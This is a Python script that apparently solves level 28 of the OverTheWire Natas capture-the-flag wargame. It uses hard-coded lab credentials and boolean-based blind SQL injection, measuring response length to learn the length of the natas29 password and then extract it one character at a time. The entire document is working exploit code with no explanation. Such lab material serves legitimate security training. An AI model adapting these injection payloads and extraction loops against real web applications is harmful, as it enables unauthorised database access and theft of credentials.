import requests
from string import ascii_letters, digits

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth = ("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")  
def query(payload):
    data = {"query": payload}
    r = requests.post(url, data=data, auth=auth)
    return len(r.text) > 3000  
print("Finding password length...")
length = 0
for i in range(1, 50):
    payload = f"' OR (SELECT LENGTH(password) FROM users WHERE username='natas29')={i}-- -"
    if query(payload):
        length = i
        print(f"Length = {length}")
        break

password = ""
chars = "_" + ascii_letters + digits 

print("Extracting password...")
for pos in range(1, length+1):
    for ch in chars:
        payload = f"' OR SUBSTRING((SELECT password FROM users WHERE username='natas29'),{pos},1)='{ch}'-- -"
        if query(payload):
            password += ch
            print(f"Position {pos}: {ch} -> {password}")
            break
    else:
        print("Char not found :(")
print("Password for natas29:", password)